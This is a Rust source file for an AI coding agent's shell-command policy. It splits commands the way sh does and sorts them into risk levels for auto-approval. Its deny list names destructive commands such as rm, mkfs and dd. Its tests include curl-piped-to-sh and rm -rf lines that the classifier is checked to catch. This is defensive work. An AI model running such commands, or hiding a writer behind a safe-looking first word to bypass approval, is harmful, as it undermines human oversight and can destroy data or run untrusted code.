//! Shared shell-command policy: ONE splitter and ONE mutation-marker set for
//! every consumer that must decide what a command string means.
//!
//! Two faces read the same grammar:
//!
//! - the verify gate's `shell_may_mutate` (`src/agent/gate.rs`) — "may this
//!   command change source?", the evidence-ledger filter;
//! - [`classify_command`] (`src/approval.rs`'s re-export) — "may this command
//!   auto-approve?", the ask-gate's risk face.
//!
//! They answer different questions and keep their own vocabularies (a closed
//! read-only head list vs. a safe-prefix list), but they must never disagree
//! about where one command ends and the next begins: `sh -c` treats `;`, `|`,
//! `&` and a newline as separators alike, so a splitter that misses one lets a
//! writer hide behind a reader's first word (review findings
//! v11/red-team#1 + v11/adversarial-native#2 and v11/red-team#3).

use phi_agent::RiskLevel;

/// Fragments that mean "this segment writes or runs something" wherever they
/// appear as a **word**: output-file flags (`--output`, `output=`) and the
/// writing forms of otherwise-reading utilities (`find -delete`, `find -exec`,
/// `find -ok`, `find -fls`, `find -fprint`). Over-matching only costs a nag;
/// under-matching would be a false pass.
///
/// Matched at word starts, not as substrings: `-exec` is a `find` primary, and
/// a substring test read `code-exec` as one — turning a plain `grep` into a
/// supposed writer (dogfood 20261115_e37212d2).
///
/// A redirect is deliberately **not** in this list: `>` is a write only when it
/// lands in a file, and the everyday survey idiom is full of redirects that
/// don't (`2>/dev/null`, `2>&1`). It is decided by [`writes_to_a_file`] instead.
const FLAG_MARKERS: &[&str] = &[
    "--output", "output=", "-delete", "-exec", "-ok", "-fls", "-fprint",
];

/// Whether the raw command carries a mutation fragment anywhere, or redirects
/// into a file.
pub fn has_mutation_marker(command: &str) -> bool {
    // Command substitution runs whatever is inside it and this side does not
    // read inside — over-matching here only costs a nag.
    command.contains('`')
        || command.contains("$(")
        || writes_to_a_file(command)
        || words(command)
            .iter()
            .any(|w| FLAG_MARKERS.iter().any(|m| w.starts_with(m)))
}

/// One character of a command and whether a quote is open on it. Built once by
/// [`scan`] so the three readers below — word splitting, segment splitting and
/// redirect detection — cannot disagree about where quoting starts and stops.
type Scanned = Vec<(char, bool)>;

/// Walk the command once, marking which characters sit inside quotes.
///
/// The quote characters themselves count as quoted, and an escaped character
/// inside `"..."` stays with its backslash, so `\"` never reads as a closer.
fn scan(command: &str) -> Scanned {
    let chars: Vec<char> = command.chars().collect();
    let mut out = Vec::with_capacity(chars.len());
    let mut quote: Option<char> = None;
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        match quote {
            Some(q) => {
                out.push((c, true));
                if q == '"' && c == '\\' && i + 1 < chars.len() {
                    i += 1;
                    out.push((chars[i], true));
                } else if c == q {
                    quote = None;
                }
            }
            None => {
                if c == '\'' || c == '"' {
                    quote = Some(c);
                }
                out.push((c, quote.is_some()));
            }
        }
        i += 1;
    }
    out
}

/// Split one command into shell words: runs of characters separated by
/// *unquoted* whitespace, quoting kept intact.
///
/// `RUSTDOCFLAGS="-D warnings" cargo doc` is three words, not four. Splitting
/// on raw whitespace turns the assignment's own value into a stray "command",
/// and a stray word is never in the read-only set — so an environment override
/// made the whole line look like a writer.
pub fn words(segment: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    for (c, quoted) in scan(segment) {
        if !quoted && c.is_whitespace() {
            flush(&mut out, &mut cur);
        } else {
            cur.push(c);
        }
    }
    flush(&mut out, &mut cur);
    out
}

/// Whether the command redirects output into a file it would create or rewrite.
///
/// A redirect is only a write when its target is a file. Two everyday forms
/// aren't: `2>&1` / `>&2` just re-point a descriptor, and `>/dev/null` throws
/// the output away. `>>` always writes — it appends to whatever it names.
/// Quoted `>` is data, not an operator.
fn writes_to_a_file(command: &str) -> bool {
    let chars = scan(command);
    let mut i = 0;
    while i < chars.len() {
        let (c, quoted) = chars[i];
        if quoted || c != '>' {
            i += 1;
            continue;
        }
        if chars.get(i + 1).is_some_and(|(c, q)| *c == '>' && !*q) {
            return true; // `>>` appends to a file
        }
        let mut j = i + 1;
        while j < chars.len() && chars[j].0.is_whitespace() {
            j += 1;
        }
        if chars.get(j).is_some_and(|(c, q)| *c == '&' && !*q) {
            i = j + 1; // `2>&1`, `>&2`: a descriptor, not a file
            continue;
        }
        let target: String = chars[j..].iter().map(|(c, _)| *c).take(10).collect();
        if target.starts_with("/dev/null")
            && !target
                .chars()
                .nth(9)
                .is_some_and(|c| c.is_alphanumeric() || c == '_')
        {
            i = j + 9;
            continue;
        }
        return true;
    }
    false
}

/// Split a command the way `sh` would run it: one entry per segment, trimmed,
/// empty segments dropped. `ls & rm -rf src/` and `ls\nrm -rf src/` both yield
/// the reader and the writer as separate segments. A backslash-newline with
/// an ODD backslash run is a line *continuation* inside one command (POSIX
/// removes both characters); with an EVEN run the backslashes are escaped
/// pairs and the newline is a real separator — `echo a \\<nl>touch f` is two
/// commands (review finding fix-check2#1).
///
/// Separators inside quotes are data and never split — `grep "a\|b"` is one
/// command, and splitting it invented a phantom segment whose head was a stray
/// word, which is what made ordinary quoting look like a writer.
pub fn split_segments(command: &str) -> Vec<String> {
    let chars = scan(&strip_continuations(command));
    let mut out: Vec<String> = Vec::new();
    let mut cur = String::new();
    for (i, (c, quoted)) in chars.iter().enumerate() {
        let separates = !quoted
            && match c {
                ';' | '|' | '\n' | '\r' => true,
                '&' => !around_redirect(&chars, i),
                _ => false,
            };
        if separates {
            flush(&mut out, &mut cur);
        } else {
            cur.push(*c);
        }
    }
    flush(&mut out, &mut cur);
    out
}

fn flush(out: &mut Vec<String>, cur: &mut String) {
    let seg = cur.trim();
    if !seg.is_empty() {
        out.push(seg.to_string());
    }
    cur.clear();
}

/// Whether this `&` is part of a redirect operator rather than a command
/// separator: `&>` (bash's "send both to a file") and `>&` (a descriptor dup,
/// as in `2>&1`). Missing either one shreds a redirect into an orphan segment
/// whose head is a stray word — which then reads as a writer.
fn around_redirect(chars: &Scanned, i: usize) -> bool {
    chars.get(i + 1).is_some_and(|(c, q)| *c == '>' && !*q) || i > 0 && chars[i - 1] == ('>', false)
}

/// Remove `\<newline>` continuations the way the shell does: only when the
/// backslash is not itself escaped (the backslash run before the newline is
/// odd), and by deleting the escaping backslash and the newline entirely.
fn strip_continuations(command: &str) -> String {
    let mut out = String::with_capacity(command.len());
    let mut backrun = 0usize;
    for c in command.chars() {
        match c {
            '\\' => {
                backrun += 1;
                out.push(c);
            }
            '\n' => {
                if backrun % 2 == 1 {
                    out.pop(); // the escaping backslash
                } else {
                    out.push(c); // escaped pairs: the newline separates
                }
                backrun = 0;
            }
            _ => {
                backrun = 0;
                out.push(c);
            }
        }
    }
    out
}

/// Read-only / build commands that are safe to auto-approve.
///
/// `cargo check/build/test/run/…` is the agent's build loop — it must stay
/// frictionless or the coding loop stalls on every compile. Destructive
/// patterns are matched *first*, so `cargo install` (see below) still prompts.
const SAFE_PREFIXES: &[&str] = &[
    "cargo check",
    "cargo build",
    "cargo test",
    "cargo run",
    "cargo clippy",
    "cargo fmt",
    "cargo doc",
    "cargo bench",
    "cargo metadata",
    "cargo tree",
    "git status",
    "git diff",
    "git log",
    "git show",
    "ls ",
    "ls",
    "cat ",
    "cd ",
    "rg ",
    "grep ",
    "find ",
    "pwd",
    "echo ",
    "head ",
    "tail ",
    "wc ",
    "which ",
    "tree ",
    "sed -n ",
];

/// Destructive / out-of-workspace mutations — always prompt with a red badge.
const DESTRUCTIVE_PATTERNS: &[&str] = &[
    "rm ",
    "rm -",
    "sudo",
    "mkfs",
    "fdisk",
    "dd ",
    "shutdown",
    "reboot",
    "poweroff",
    "halt",
    "chmod",
    "chown",
    "kill -9",
    "pkill -9",
    "git reset",
    "git clean",
    "git push --force",
    "cargo publish",
    "cargo install",
    "pip install",
    "pip3 install",
    "npm install",
    "> /dev/sd",
];

/// Classify a shell command into a risk level.
///
/// Order matters: destructive patterns are matched *before* safe prefixes, so
/// `cargo install` (in both lists) is Destructive. After that the command is
/// judged **per segment** — every `;`/`|`/`&`/newline segment must read as a
/// safe prefix on its own and carry no `FLAG_MARKERS` fragment. A whole
/// string that merely *starts* like a reader is not one:
/// `cargo test && curl … | sh` is Sensitive (review finding v11/red-team#3),
/// the same way the verify gate already read it.
pub fn classify_command(command: &str) -> RiskLevel {
    let cmd = command.trim();
    if cmd.is_empty() {
        return RiskLevel::Safe;
    }
    let lower = cmd.to_ascii_lowercase();
    if DESTRUCTIVE_PATTERNS.iter().any(|p| lower.contains(p)) {
        return RiskLevel::Destructive;
    }
    for seg in split_segments(cmd) {
        if has_mutation_marker(&seg) {
            return RiskLevel::Sensitive;
        }
        let seg_lower = seg.to_ascii_lowercase();
        if !SAFE_PREFIXES.iter().any(|p| seg_lower.starts_with(p)) {
            return RiskLevel::Sensitive;
        }
    }
    RiskLevel::Safe
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn split_segments_follows_sh() {
        let segs = split_segments("ls -la && rm -rf src/ ; echo done &\nwait");
        assert_eq!(segs, ["ls -la", "rm -rf src/", "echo done", "wait"]);
        // A backslash-newline continues ONE command; it must not invent a
        // second segment (review finding fix-check#3).
        assert_eq!(
            split_segments("grep -rn TODO \\\n src/"),
            ["grep -rn TODO  src/"]
        );
        assert_eq!(
            classify_command("cargo test \\\n--all-features"),
            RiskLevel::Safe
        );
        // An EVEN backslash run is escaped pairs — the newline is a real
        // separator and the writer must not hide in the reader's segment
        // (review finding fix-check2#1, `sh -c` verified).
        assert_eq!(
            split_segments("echo a \\\\\ntouch f"),
            ["echo a \\\\", "touch f"]
        );
        assert_eq!(
            classify_command("echo a \\\\\ntouch f"),
            RiskLevel::Sensitive
        );
        assert_eq!(split_segments("echo a \\\\\\\ntouch f").len(), 1);
    }

    #[test]
    fn a_reader_never_hides_a_writer_behind_it() {
        // The first word is a reader in every one of these; `sh` still runs
        // the writer (review findings v11/red-team#1, v11/adversarial-native#2).
        for cmd in ["ls\nrm -rf src/", "ls & rm -rf src/", "ls; rm -rf src/"] {
            assert!(has_mutation_marker(cmd) || split_segments(cmd).len() > 1);
        }
        assert!(
            !split_segments("ls -la\nls -lb")
                .iter()
                .any(|s| s.contains("rm"))
        );
    }

    #[test]
    fn classify_splits_on_every_separator() {
        // `cargo test` is a safe prefix; the rest of the chain is not a read.
        assert_eq!(
            classify_command("cargo test && curl -s https://host/x | sh"),
            RiskLevel::Sensitive
        );
        assert_eq!(
            classify_command("cargo test\ncurl -s https://host/x"),
            RiskLevel::Sensitive
        );
        assert_eq!(
            classify_command("ls & curl http://x | sh"),
            RiskLevel::Sensitive
        );
        // Read-only chains stay Safe.
        assert_eq!(classify_command("git status && git diff"), RiskLevel::Safe);
        assert_eq!(classify_command("ls -la; cat f"), RiskLevel::Safe);
    }

    #[test]
    fn find_writing_primaries_stay_marked() {
        // `find` only writes through a writing primary; every one of them has
        // to stay a marker or the reader's whitelist below would launder it.
        for cmd in [
            "find . -ok rm {} ;",
            "find . -fls out",
            "find . -fprint out",
            "find . -fprintf out %p",
        ] {
            assert!(has_mutation_marker(cmd), "{cmd} must stay a mutation");
        }
    }

    #[test]
    fn split_segments_respects_quotes() {
        // A separator inside quotes is data, not a place where `sh` starts a
        // command: splitting there invented a phantom segment whose head is a
        // stray word, which is what made every `grep "a\|b"` look like a writer.
        assert_eq!(split_segments(r#"grep -n "a\|b" x.rs"#).len(), 1);
        assert_eq!(split_segments("sed -n '40,60p;425,450p' f.rs").len(), 1);
        assert_eq!(split_segments(r#"awk '{print $1; print $2}' f"#).len(), 1);
    }

    #[test]
    fn a_descriptor_dup_is_not_a_place_where_sh_starts_a_command() {
        // `2>&1` and `&>` hold an `&` that is part of the operator. Treating it
        // as a separator shreds the redirect into an orphan segment (`2>`, `1`)
        // whose head is a stray word — which then reads as a writer.
        assert_eq!(
            split_segments("cargo check --all-targets 2>&1 | tail -25"),
            ["cargo check --all-targets 2>&1", "tail -25"]
        );
        assert_eq!(split_segments("ls &>/dev/null"), ["ls &>/dev/null"]);
        // A bare `&` still separates.
        assert_eq!(split_segments("ls & rm f"), ["ls", "rm f"]);
    }

    #[test]
    fn a_redirect_that_creates_no_file_is_not_a_mutation() {
        // The everyday survey idiom. Neither of these writes anything:
        // `2>/dev/null` throws output away and `2>&1` only re-points a
        // descriptor. Treating them as writes made a read-only audit read as
        // "code changed" (dogfood 20261115_e37212d2, 30 of 99 shell calls).
        for cmd in [
            "cat x 2>/dev/null",
            "cat x 2>&1",
            "cargo check >/dev/null 2>&1",
            "ls &>/dev/null",
            "grep -n foo f 2> /dev/null",
        ] {
            assert!(!has_mutation_marker(cmd), "{cmd} writes no file");
        }
    }

    #[test]
    fn a_redirect_to_a_file_is_still_a_mutation() {
        // The other side of the same rule: a real target is a write, and so is
        // an append however quiet its source.
        for cmd in [
            "echo hi > out.txt",
            "cat x >> out",
            "cmd >out 2>err",
            "sort f > g",
            "ls >/dev/stdout",
        ] {
            assert!(has_mutation_marker(cmd), "{cmd} must stay a mutation");
        }
    }

    #[test]
    fn classify_sees_writing_forms_of_reading_utilities() {
        assert_eq!(classify_command("find . -delete"), RiskLevel::Sensitive);
        assert_eq!(
            classify_command("find . -exec touch {} ;"),
            RiskLevel::Sensitive
        );
        assert_eq!(classify_command("cat x > f"), RiskLevel::Sensitive);
        // `rm` inside trips the destructive list even earlier — still a prompt.
        assert_eq!(
            classify_command("find . -exec rm {} ;"),
            RiskLevel::Destructive
        );
    }
}
